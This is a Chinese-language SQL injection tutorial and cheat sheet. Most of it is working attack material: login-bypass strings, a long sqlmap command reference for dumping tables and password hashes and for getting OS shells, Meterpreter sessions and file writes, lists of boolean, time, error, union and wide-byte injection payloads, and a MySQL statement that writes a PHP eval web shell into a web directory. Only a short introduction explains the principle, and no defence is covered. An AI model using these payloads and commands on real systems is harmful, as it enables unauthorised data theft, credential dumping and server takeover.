# SQL注入漏洞

## 一、 漏洞的原理

所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将(恶意)的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入(恶意)SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。造成SQL注入漏洞原因有两个：一个是没有对输入的数据进行过滤(过滤输入)，还有一个是没有对发送到数据库的数据进行转义(转义输出)。

## 二、漏洞的危害

1、攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。
2、可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。
3、如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。
4、经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。

以下是我整理的常见的万能密码：

```sql
(1) 用户名输入： 'or 1=1 or'  密码：任意
(2) Admin' -- (或'or 1=1 or' --)(admin or 1=1 --) (MSSQL)(直接输入用户名，不进行密码验证)
(3) 用户名输入：admin   密码输入：' or '1'='1  也可以
(4) 用户名输入：admin' or 'a'='a    密码输入：任意
(5) 用户名输入：' or 1=1 --
(6) 用户名输入：admin' or 1=1 --  密码输入：任意
(7) 用户名输入：1'or'1'='1'or'1'='1   密码输入：任意
```

## 三、注入类型

#### 1、布尔类型注入，根据页面的回显来判断是否存在布尔类型的注入

当判断条件为真时，返回页面正常。
![image.png](https://cdn.nlark.com/yuque/0/2020/png/1355955/1588141294673-65d72ab7-9929-4395-a07b-8af90e1f896c.png#align=left&display=inline&height=515&margin=%5Bobject%20Object%5D&name=image.png&originHeight=515&originWidth=1035&size=116196&status=done&style=none&width=1035)

当判断条件为假时，返回页面无内容。
![image.png](https://cdn.nlark.com/yuque/0/2020/png/1355955/1588141414585-dfe88d00-73af-4b35-b771-0e72814297cb.png#align=left&display=inline&height=505&margin=%5Bobject%20Object%5D&name=image.png&originHeight=505&originWidth=1087&size=125255&status=done&style=none&width=1087)

#### 2、时间类型注入，根据页面的回显的时间来判断是否存在时间类型注入

使用延时函数sleep，可以看到页面的响应时间大于10秒。
![image.png](https://cdn.nlark.com/yuque/0/2020/png/1355955/1588141588524-8e86fd89-7028-4407-b2ef-594ea474a1c0.png#align=left&display=inline&height=475&margin=%5Bobject%20Object%5D&name=image.png&originHeight=475&originWidth=1162&size=125906&status=done&style=none&width=1162)

#### 3、报错类型注入，根据页面会返回的错误信息来判断是否存在报错类型注入

提交错误的sql语句，可以看到页面报错。
![image.png](https://cdn.nlark.com/yuque/0/2020/png/1355955/1588141730035-63391532-361f-48e2-b350-97092096e65a.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&name=image.png&originHeight=227&originWidth=1338&size=36498&status=done&style=none&width=1338)

#### 4、联合查询注入，使用union语句，检测联合查询语句是否执行，来判断是否存在联合查询注入

使用union语句，可以看到当前数据库。
![image.png](https://cdn.nlark.com/yuque/0/2020/png/1355955/1588141996003-68757438-ff17-4a9c-92a1-d71136698b2e.png#align=left&display=inline&height=347&margin=%5Bobject%20Object%5D&name=image.png&originHeight=472&originWidth=1015&size=55495&status=done&style=none&width=746)

#### 5、堆查询的注入，使用;结束当前语句，在后面执行自己的语句，检测后面的语句是否执行来判断是否存在堆查询注入。

使用堆查询注入，向数据库插入一条数据。
![image.png](https://cdn.nlark.com/yuque/0/2020/png/1355955/1588142820133-a55338c6-e91c-4131-842e-eff1c6cee0e9.png#align=left&display=inline&height=410&margin=%5Bobject%20Object%5D&name=image.png&originHeight=410&originWidth=909&size=87571&status=done&style=none&width=909)
![image.png](https://cdn.nlark.com/yuque/0/2020/png/1355955/1588142874258-f8b728c9-c9b8-4d4f-a0b6-c8f0b255ca86.png#align=left&display=inline&height=374&margin=%5Bobject%20Object%5D&name=image.png&originHeight=374&originWidth=667&size=49587&status=done&style=none&width=667)

#### 6、内联查询注入，在查询语句中嵌套sql语句，检测嵌套的语句是否执行来判断是否存在内联查询注入。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1355955/1588141996003-68757438-ff17-4a9c-92a1-d71136698b2e.png#align=left&display=inline&height=472&margin=%5Bobject%20Object%5D&name=image.png&originHeight=472&originWidth=1015&size=55495&status=done&style=none&width=1015)

## 注入工具

### 1、 sqlmap

#### sqlmap支持的数据库有

MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

#### sqlmap常用命令

```sql
--data="name=value"         # post 注入
--cookie="id=1"             # cookie 注入
--random-agent              # 随机的HTTP头
--delay 1                   # 发包延迟一秒
-p                          # 指定测试的参数(s)
--dbms                      # 指定数据库
--os                        # 指定操作系统
--tamper                    # 使用脚本来注入数据
--level                     # 测试级别 (1-5, default 1)
--technique                 # 要使用的SQL注入技术
--count                     # 检索表的项数(s)
--eta                       # 显示每个输出的预计到达时间
--flush-session             # 刷新当前目标的会话文件
--mobile                    # 通过HTTP用户代理头模仿智能手机
```

#### sqlmap常用语法

```sql
# 获取当前数据库
python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --random-agent --current-db
# 获取当前数据库
python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --random-agent -D "数据库" --tables
# 获取当前字段
python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --random-agent -D "数据库" -T "表名" --columns
# 获取当前表数据
python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" -D "数据库" -T "表名" -C "字段" --dump --random-agent
# 获取数据库当前用户和密码
python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --random-agent --current-user --passwords --is-dba
# 指定数据库和操作系统
python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --random-agent --dbms='mysql' --os='linux'
# 指定注入方式
python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --random-agent --technique="BEUSTQ"
# 检测waf
python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --random-agent --check-waf --identify-waf
```

#### sqlmap单命令

```sql
sqlmap -h, --help           # 显示基本的帮助信息并退出
sqlmap -hh                  # 显示高级帮助消息并退出
sqlmap --version            # 显示程序的版本号并退出
```

#### sqlmap 选取目标

```sql
-d DIRECT                 # 用于直接数据库连接的连接字符串
-u URL, --url=URL         # Target URL (e.g. "<http://www.site.com/vuln.php?id=1>")
-l LOGFILE                # 从Burp或WebScarab代理日志文件中解析目标
-x SITEMAPURL             # 从远程站点地图(.xml)文件中解析目标
-m BULKFILE               # 扫描文本文件中给定的多个目标
-r REQUESTFILE            # 从文件中加载HTTP请求
-g GOOGLEDORK             # 处理作为目标url的谷歌dork结果
-c CONFIGFILE             # 从配置INI文件中加载选项
```

在知道数据库的详细信息的时候可以直接连接数据库，可以是任何类型的数据库，包括文件型的

```sql
命令（后面可加需要执行的sqlmap命令）：
python2 sqlmap.py  -d "mysql://root:root@127.0.0.1:3306/ceshi" [命令1] [命令2]
执行此命令需要安装PyMySQL否则会报错
pip2 install PyMySQL -i https://pypi.tuna.tsinghua.edu.cn/simple/
```

对主机进行探测

```sql
# get型探测
python2 sqlmap.py -u 'http://xxx/md5.php?user=1'
# post型探测
python2 sqlmap.py -u 'http://xxx/md5.php?user=1' --data="name=value"
# cookie型探测
python2 sqlmap.py -u 'http://xxx/md5.php?user=1' --cookie="id=1"
```

对burp抓取的数据包进行探测

```sql
保持burp的日志文件：
Burp ——> Project options ——> Misc ——> logging ——> Proxy ——> Requests ——> 保存文件名
python2 sqlmap.py -l 保存文件名
过滤指定目标：正则方式
python2 sqlmap.py -l 保存文件名 --scope="(www)?\.target\.(com|net|org)"
```

从https请求的数据包中进行探测

```sql
python2 sqlmap.py -r 1.txt
1.txt内容：
GET / HTTP/1.1
Host: www.fake-blog.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: e526aaf658175f78ad79b6022307dbfc__typecho_uid=1; e526aaf658175f78ad79b6022307dbfc__typecho_authCode=%24T%243QyFY9nWy70cbdd861da260d4c8acd5fcb7381357; PHPSESSID=gjepu6jfs4dgql95t8ecckafm0
Connection: close
```

探测多个目标

```sql
python2 sqlmap.py -m 1.txt
1.txt内容：
https://xxx/xx.php?server=1
http://xxx/databases.php?server=1
```

不常用的：

```sql
探测站点地图(.xml)文件：
python2 sqlmap.py -x https://xxx/sitemap.xml
从配置INI文件中:
python2 sqlmap.py -c sqlmap.conf
谷歌语法探测,前提是需要能访问的谷歌:
python2 sqlmap.py -g "inurl:'id=1'"
```

#### sqlmap设置http方法

```sql
--method=METHOD       # 强制使用给定的HTTP方法 (e.g. PUT)
--data=DATA           # POST 请求 (e.g. "id=1")
--param-del=PARA..    # 用于分割参数值的字符 (e.g. &)
--cookie=COOKIE       # HTTP Cookie头值 (e.g. "PHPSESSID=a8d127e..")
--cookie-del=COO..    # 用于分割cookie值的字符 (e.g. ;)
--load-cookies=L..    # 包含Netscape/wget格式cookie的文件
--drop-set-cookie     # 从响应中忽略Set-Cookie头
--user-agent=AGENT    # HTTP用户代理头值
--random-agent        # 使用随机选择的HTTP用户代理头值
--host=HOST           # HTTP主机标题值
--referer=REFERER     # HTTP引用头值
-H HEADER, --hea..    # 额外的请求头 (e.g. "X-Forwarded-For: 127.0.0.1")
--headers=HEADERS     # 额外的请求头多个 (e.g. "Accept-Language: fr\nETag: 123")
--auth-type=AUTH..    # HTTP身份验证类型 (Basic, Digest, NTLM or PKI)
--auth-cred=AUTH..    # HTTP身份验证凭证 (name:password)
--auth-file=AUTH..    # HTTP认证PEM证书/私钥文件
--ignore-code=IG..    # 忽略(有问题的)HTTP错误代码 (e.g. 401)
--ignore-proxy        # 忽略系统默认代理设置
--ignore-redirects    # 忽略重定向的尝试
--ignore-timeouts     # 忽略连接超时
--proxy=PROXY         # 使用代理连接到目标URL
--proxy-cred=PRO..    # 代理身份验证凭证 (name:password)
--proxy-file=PRO..    # 从文件中加载代理列表
--tor                 # 使用Tor匿名网络
--tor-port=TORPORT    # 设置Tor代理端口而不是默认端口
--tor-type=TORTYPE    # 设置Tor代理类型 (HTTP, SOCKS4 or SOCKS5 (default))
--check-tor           # 检查Tor是否正确使用
--delay=DELAY         # 每个HTTP请求之间的延迟
--timeout=TIMEOUT     # 超时连接前等待的秒数 (default 30)
--retries=RETRIES     # 连接超时时重试 (default 3)
--randomize=RPARAM    # 随机改变给定参数的值(s)
--safe-url=SAFEURL    # 测试期间经常访问的URL地址
--safe-post=SAFE..    # 发送数据到一个安全的URL
--safe-req=SAFER..    # 从文件中加载安全的HTTP请求
--safe-freq=SAFE..    # 测试对给定安全URL的两次访问之间的请求
--skip-urlencode      # 跳过有效负载数据的URL编码
--csrf-token=CSR..    # 用于保存反csrf令牌的参数
--csrf-url=CSRFURL    # 要访问的URL地址提取反csrf令牌
--force-ssl           # 强制使用SSL/HTTPS
--chunked             # 使用HTTP块传输编码(POST)请求
--hpp                 # 使用HTTP参数污染方法
--eval=EVALCODE       # 在请求之前评估提供的Python代码 (e.g. "import hashlib;id2=hashlib.md5(id).hexdigest()")
```

设置cookie：注意。检测cookie注入需要设置 --level 3

```sql
登录页面，或者测试cookie注入的时候，需要先设置cookie：
python2 sqlmap.py --cookie="e526aaf658175f78ad79b6022307dbfc__typecho_uid=1; PHPSESSID=rn4bqn7v8nkd9871b9ha7p4457" --cookie-del=";" -u "http://www.xxx.com/admin/write-post.php?cid=91" --level 3
```

sqlmap 设置 user_agent 请求头信息，这个对绕waf有点作用，也可以user_agent值进行注入检测，需要设置 --level 3

```sql
在\data\txt\user-agents.txt文件中随机取一个user_agent
python2 sqlmap.py -u 'http://xxx/md5.php?user=1' --random-agent
```

设置额外的HTTP请求头,需要用\n 换号符分割

```sql
python2 sqlmap.py -u 'http://xxx/md5.php?user=1' --headers="Hosh:www.xxx.com\nUser-agent:Firefox 1.0"
```

如果要对HTTP主机头进行检测需要设置 --level 5
如果相对HTTP引用头（HTTP Referer）进行检测，需要设置 --level 3
sqlmap设置HTTP协议的认证参数：--auth-type、--auth-cred、--auth-file

```sql
--auth-type 支持 Basic、Digest、NTLM 协议认证
--auth-cred 认证的语法为：username:password
--auth-file 客户端需要私钥认证的时候，需要用到sqlmap设置私钥

python2 sqlmap.py -u "http://url/arit.php?id=1" --auth-type Basic --auth-cred "name:pass"
python2 sqlmap.py -u "http://url/arit.php?id=1" --auth-file 私钥文件.txt
```

sqlmap设置HTTP代理参数：--proxy、--proxy-cred、--proxy-file、--ignore-proxy

```sql
--proxy 设置HTTP代理的格式为：--proxy http[s]://ip:[端口]
--proxy-cred 设置HTTP代理服务器认证信息（需要账号和密码的时候），格式--proxy-cred "name:pass"
--proxy-file 从代理文件中设置代理
--ignore-proxy 忽略系统范围的HTTP代理服务器设置的代理

python2 sqlmap.py -u "http://url/arit.php?id=1" --proxy "http://192.168.1.1:8000" --proxy-cred "name:pass"
```

sqlmap中设置Tor网络参数：--tor、--tor-port、--tor-type、--check-tor，使用Tor需要先安装并开启服务

#### sqlmap的性能优化

```sql
-o                    # 打开所有优化开关
--predict-output      # 预测常见查询输出
--keep-alive          # 使用持久HTTP连接,减少多服务器的请求
--null-connection     # 检索没有实际HTTP响应主体的页面长度，用于盲注，加快注入效率
--threads=THREADS     # 并发HTTP请求的最大数量(default 1)
```

#### 指定测试参数

```sql
-p TESTPARAMETER      # 指定测试的参数(s)
--skip=SKIP           # 跳过给定参数的测试(s)
--skip-static         # 跳过看起来不是动态的测试参数
--param-exclude=..    # 从测试中排除参数 (e.g. "ses")
--param-filter=P..    # 按位置选择可测试参数 (e.g. "POST")
--dbms=DBMS           # 强制后端DBMS提供值
--dbms-cred=DBMS..    # DBMS身份验证凭证 (user:password)
--os=OS               # 强制后端DBMS操作系统提供值
--invalid-bignum      # 使用大数字表示无效值（e.g. "id=99999"）
--invalid-logical     # 对无效值使用逻辑操作（e.g. "id=1 and 1=2"）
--invalid-string      # 使用随机字符串使值无效（e.g. "id=aadsad"）
--no-cast             # 关闭有效载荷释放机制
--no-escape           # 关闭字符串转义机制
--prefix=PREFIX       # 注入有效载荷前缀串
--suffix=SUFFIX       # 注入有效载荷后缀字符串
--tamper=TAMPER       # 使用给定的脚本来篡改注入数据
```

还有用（*）指定注入点，也可以%注入点%
sqlmap设置payload前缀和后缀

```sql
假如sql语句为：
select * from users where id=('.$_GET["id"].') limit 0,1
可以设置前缀为：') ,后缀为：and ('adc' = 'adc
python sqlmap.py -u "http://url/id=1" -p "id" --prefix=" ') " --suffix=" and ('adc' = 'adc "
使其语句为：
select * from users where id=('1') and ('adc' = 'adc ') limit 0,1
```

#### sqlmap 探测参数

```sql
--level=LEVEL             # 测试级别 (1-5, default 1)
--risk=RISK               # 测试要执行的风险 (1-3, default 1)
--string=STRING           # 当查询被计算为True时要匹配的字符串
--not-string=NOT..        # 当查询被计算为False时要匹配的字符串
--regexp=REGEXP           # 当查询被计算为True时，要匹配Regexp
--code=CODE               # 当查询被评估为True时匹配的HTTP代码
--text-only               # 仅根据文本内容比较页面
--titles                  # 仅根据标题比较页面
```

#### sqlmap 注入技术参数

```sql
--technique=TECH..        # 要使用的SQL注入技术 (default "BEUSTQ")
    - B: 基于布尔的盲注   (Boolean-based blind)
    - E: 基于报错注入     (Error-based)
    - U: 基于查询注入     (Union query-based Union)
    - S: 基于堆叠注入     (Stacked queries )
    - T: 基于时间的盲注   (Time-based blind)
    - Q: 基于内联查询注入 (Inline queries)
--time-sec=TIMESEC        # 时间盲注响应的秒数 (default 5)
--union-cols=UCOLS        # 联合查询SQL注入的列的范围 (default 1-10)
--union-char=UCHAR        # 修改union列数的字符
--union-from=UFROM        # 设置UNION查询的具体表进行SQL注入
--dns-domain=DNS..        # 设置DNS流量突破限制，需要有一个开发53端口的dns服务器
--second-url=SEC..        # 结果页面URL搜索二级响应
--second-req=SEC..        # 从文件中加载二级HTTP请求
-f, --fingerprint         # 识别DBMS版本指纹，时间长，可以用-b、-banner
```

#### 检索数据库信息

```sql
-a, --all                 # 检索所有
-b, --banner              # 检索DBMS横幅
--current-user            # 检索DBMS当前用户
--current-db              # 检索DBMS当前数据库
--hostname                # 检索DBMS服务器主机名
--is-dba                  # 检测DBMS当前用户是否是DBA
--users                   # 列举DBMS用户
--passwords               # 枚举DBMS用户的密码散列
--privileges              # 枚举DBMS用户特权
--roles                   # 枚举DBMS用户角色
--dbs                     # 列举DBMS数据库
--tables                  # 枚举DBMS数据库表
--columns                 # 枚举DBMS数据库表列
--schema                  # 枚举DBMS模式
--count                   # 检索表的项数(s)
--dump                    # 转储DBMS数据库表条目
--dump-all                # 转储所有DBMS数据库表条目
--search                  # 搜索列、表和/或数据库名称(s)
--comments                # 在枚举期间检查DBMS注释
--statements              # 检索在DBMS上运行的SQL语句
-D DB                     # 要枚举的DBMS数据库
-T TBL                    # 要枚举的DBMS数据库表
-C COL                    # 要枚举的DBMS数据库表列
-X EXCLUDE                # 不枚举的DBMS数据库标识符
-U USER                   # 要枚举的DBMS用户
--exclude-sysdbs          # 枚举表时排除DBMS系统数据库
--pivot-column=P..        # 主列名称
--where=DUMPWHERE         # 在表转储时使用WHERE条件
--start=LIMITSTART        # 首先转储要检索的表条目
--stop=LIMITSTOP          # 要检索的最后一个转储表条目
--first=FIRSTCHAR         # 首先查询要检索的输出字元
--last=LASTCHAR           # 最后一个要检索的查询输出字字符
--sql-query=SQLQ..        # 要执行的SQL语句
--sql-shell               # 提示输入交互式SQL shell
--sql-file=SQLFILE        # 从给定文件执行SQL语句(s)
```

#### 使用字段破解

mysql<5 的使用字段破解表、字段、文件

```sql
--common-tables           # 使用字段破解表的存在性
--common-columns          # 使用字段破解列的存在性
--common-files            # 使用字段破解表文件是否存在
```

#### 用户定义函数注入

```sql
--udf-inject              # 注入自定义用户定义函数
--shared-lib=SHLIB        # 共享库的本地路径
```

#### 文件系统访问

```sql
--file-read=FILE..        # 读取目标一个文件
--file-write=FIL..        # 从本地写入
--file-dest=FILE..        # 写入目标路径

写入文件需要知道系统的绝对路径
sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --file-write=本地文件路径 --file-dest="写入路径/写入的文件名"
```

#### 操作系统访问

```sql
--os-cmd=OSCMD            # 执行操作系统命令
--os-shell                # 提示输入交互式操作系统shell,会在网站上上传tmpbviht.php文件
--os-pwn                  # 提示输入OOB shell、Meterpreter或VNC，用--msf-path=""指定Meterpreter
--os-smbrelay             # 单击提示符即可获得OOB shell、Meterpreter或VNC
--os-bof                  # 存储过程缓冲区溢出利用
--priv-esc                # 数据库处理用户权限升级
--msf-path=MSFPATH        # 安装Metasploit框架的本地路径
--tmp-path=TMPPATH        # 临时文件目录的远程绝对路径
```

#### 访问Windows注册表

```sql
--reg-read                # 读取Windows注册表项值
--reg-add                 # 编写一个Windows注册表项值数据
--reg-del                 # 删除Windows注册表项值
--reg-key=REGKEY          # Windows注册表键
--reg-value=REGVAL        # Windows注册表项值
--reg-data=REGDATA        # Windows注册表键值数据
--reg-type=REGTYPE        # Windows注册表项值类型
```

#### 设置一些通用的工作参数

```sql
-s SESSIONFILE            # 从存储的(.sqlite)文件加载会话
-t TRAFFICFILE            # 将所有HTTP通信记录到文本文件中
--batch                   # 永远不要请求用户输入，使用默认行为
--binary-fields=..        # 具有二进制值的结果字段 (e.g. "digest")
--check-internet          # 在评估目标之前检查网络连接
--crawl=CRAWLDEPTH        # 从目标URL开始抓取网站
--crawl-exclude=..        # 从爬行中排除页面 (e.g. "logout")
--csv-del=CSVDEL          # CSV输出中使用的分隔字符 (default ",")
--charset=CHARSET         # 盲SQL注入字符集 (e.g. "0123456789abcdef")
--dump-format=DU..        # 转储数据格式 (CSV (default), HTML or SQLITE)
--encoding=ENCOD..        # 用于数据检索的字符编码 (e.g. GBK)
--eta                     # 显示每个输出的预计到达时间
--flush-session           # 刷新当前目标的会话文件
--forms                   # 在目标URL上解析和测试表单
--fresh-queries           # 忽略存储在会话文件中的查询结果
--har=HARFILE             # 将所有HTTP通信记录到一个HAR文件中
--hex                     # 在数据检索期间使用十六进制转换
--output-dir=OUT..        # 自定义输出目录路径
--parse-errors            # 解析和显示来自响应的DBMS错误消息
--preprocess=PRE..        # 使用给定的脚本对响应数据进行预处理
--repair                  # 具有未知字符标记的红块项 (?)
--save=SAVECONFIG         # 将选项保存到配置INI文件中
--scope=SCOPE             # 从提供的代理日志中筛选目标
--test-filter=TE..        # 根据有效负载和/或标题选择测试 (e.g. ROW)
--test-skip=TEST..        # 跳过有效负载和/或标题的测试 (e.g. BENCHMARK)
--update                  # 更新sqlmap
```

#### 其他参数

```sql
-z MNEMONICS        使用短助记符 (e.g. "flu,bat,ban,tec=EU")
--alert=ALERT       找到SQL注入时运行主机OS命令
--answers=ANSWERS   预定义的答案 (e.g. "quit=N,follow=N")
--beep              查询和/或发现SQL注入时发出哔哔声
--cleanup           从sqlmap特定的UDF和表中清理DBMS
--dependencies      检查缺少(可选)sqlmap依赖项
--disable-coloring  禁用控制台输出着色
--gpage=GOOGLEPAGE  使用来自指定页码的谷歌dork结果
--list-tampers      显示可用的篡改脚本列表
--mobile            通过HTTP用户代理头模仿智能手机
--offline           脱机工作模式 (only use session data)
--purge             安全地从sqlmap数据目录中删除所有内容
--skip-waf          跳过WAF/IPS保护的启发式检测
--smart             只有在启发式为正时才进行彻底的测试(s)
--sqlmap-shell      提示输入一个交互式sqlmap shell
--tmp-dir=TMPDIR    存储临时文件的本地目录
--web-root=WEBROOT  Web服务器文档根目录 (e.g. "/var/www")
--wizard            初学者使用的简单向导界面
```

## 手工注入

## 数据库元数据表

```linux
information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。

元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。

也就是说information_schma可以查到你的所有的搭建的数据库名、表名和列的数据类型，在一切条件未知的情况下，存在注入点的话我们可以直接尝试对information_schema进行访问，从而获得更多的信息。

SCHEMATA:提供了当前MySQL实例中所有数据库的信息
TABLES:所有数据库表的信息
CONLUMNS：提供了列信息
```

## 测试注入点的语句

```linux
# 基础判断注入语句
||0--+
||1--+
&& true--+
&& false--+
and 1=1--+
and 1=2--+
and 2>1--+
and 2>3--+
and '1'='1
and '1'='2
and "1"="1"--+
and "1"="2"--+
and '1'='2' )
and ("x"="x
or 1=1 --+
or 1=2 --+
or ''=''--+
or 's'='s'--+
or ('a'='a
and 1=1 and '%'='
order+by+1--+
order+by+100--+
and length(database())>=1--+
and length(database())>=100--+
and (select count(*) from admin)>0; --+
and (select count(*) from admin)>100; --+
AND id != NULL; --+
or id != NULL; --+
and length((select user()))>=1--+
and length((select database()))>=1--+
and ord(substr(database(),1,1))=64--+
and ord(substr(database(),1,1))=150--+
and if(ascii(substr((select database()),1,1))>64, 1, 0)--+

# 判断时间注入语句
and sleep(3)--+
and (() or sleep(3))--+
and (select sleep(5))--+
and ('1'=' or sleep(3))--+
and if(length(database())>0,sleep(5),1)--+
and if(length((select user()))>1,sleep(10),0)--+
and if(length((select database()))>1,sleep(10),0)--+

# 判断报错注入语句
or updatexml(1,concat(0x5e5e,version(),0x5e5e),1)--+
union select 1,1,exp(~(select*from(select user())x))--+
union select 1,1,exp(~(select*from(select database())x))--+
union select updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
union select updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
union SELECT 1,1,ExtractValue('<a><b><b/></a>',concat('~',(select user()),'~'))--+
union SELECT 1,1,ExtractValue('<a><b><b/></a>',concat('~',(select database()),'~'))--+
union select count(*),1, concat('~',(select user()),'~', floor(rand()*2)) as a from information_schema.tables group by a--+

# 联合查询注入，要让前面的参数不正确，这个才显示
union+select+1--+
union+select+1,2,3,4,5,6,7,8,9--+
union select @@version --+
union select user() --+
union select database()--+

# 宽字节注入
%a1%27 or 1--+
%df%27 and 1--+
%df%27 or()or 0
%a1%27 order+by+1--+
%df%27 or 0 union select 1,group_concat(schema_name) from information_schema.schemata--+
```


## 常用函数整合语句

```sql
select @@datadir;                       # 数据库的存储目录
select @@basedir;                       # MYSQL 获取安装路径
select @@version_compile_os;            # 服务器的操作系统
select database();                      # 当前连接的数据库名称
select user();                          # 当前连接数据库的用户
select version();                       # 数据库的版本
SELECT left('abc',2)                    # 返回ab
SELECT right('abc',2)                   # 返回bc
select concat(1,2)                      # 将1和2连接成12
select concat_ws('--',1,2)              # 将1和2连接成1--2
select length(123);                     # 计算字符串的长度是3
select sleep(5);                        # 延时5秒显示
select rand();                          # 随机数
select floor(1.1);                      # 取整数
SELECT floor(rand()*2);                 # 生成0|1的随机数
select substr('abc',1,1);               # 截取,从1开始的
select mid('abc',3,1)                   # 截取,从1开始的
SELECT Ascii('a');                      # 返回字符的ascii码
SELECT ord('a');                        # 返回字符的ascii码
SELECT hex('a');                        # 返回16进制数
SELECT char(97);                        # 返回a
if(expr1,expr2,expr3):                  # 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
select count(*) from users;             # 返回users表中的数据条数
select length(database())>=1;           # 判断数据库的长度是否大于1
select @@datadir,@@basedir;             # 显示数据库的位置和安装位置
ascii(substr((select database()),1,1))          # 返回数据库名称的第一个字母,转化为ascii码
ascii(substr((select database()),1,1))>64       # ascii大于64就返回true，就返回1，否则返回0
ORD(MID(DATABASE(),1,1))>119                    # ASCII码是否大于119
SELECT concat((select database()));                     # 显示当前数据库名
SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));    # 显示当前数据库名，并加一个随机数

# 如果ascii大于64就会显示，否则就不会显示
and if(ascii(substr((select database()),1,1))>64, 1, 0)

# 将每一行的name和pass连接起来，逗号隔开，一起输出
select group_concat(name,pass) from user;

# 将多行查询结果以逗号分隔全部输出，每一行的结果可用设置的分隔符作字段的间隔
select group_concat(concat_ws('--',name,pass)) from user

# 显示出的结果数量就是有多少条数据
SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) FROM users;
SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) FROM information_schema.schemata;
```

## 常用的语句

```sql
# 查看有多少个数据库
select COUNT(schema_name) from information_schema.schemata
# 查看所有数据库
select schema_name from information_schema.schemata LIMIT 4, 1
# 查看数据库有几个表
SELECT COUNT(table_name) FROM information_schema.TABLES WHERE table_schema = 'security';
# 查看数据库的所有表
select table_name from information_schema.tables where table_schema = 'security' LIMIT 4, 1
# 查看数据表有多少列
select COUNT(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users'
# 查看数据库表的所有列
select column_name from information_schema.columns where table_schema = 'security' and table_name = 'users' LIMIT 1,1;
# 查看数据表中有多少数据
SELECT COUNT(*) FROM `security`.`users`
# 查看数据表中的数据
select concat_ws('@',username,password) from `security`.`users` limit 0,1
# 写入文件
select '<?php @eval($_POST["giantbranch"]);?>' into outfile 'D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\Leaama.php'
# 导出文件
select load_file('D:\\xxx\\index.php') into outfile 'D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\xx.txt'
# 直接获取当前数据库的字段
select table_name from information_schema.tables where table_schema=database() limit 0,1
```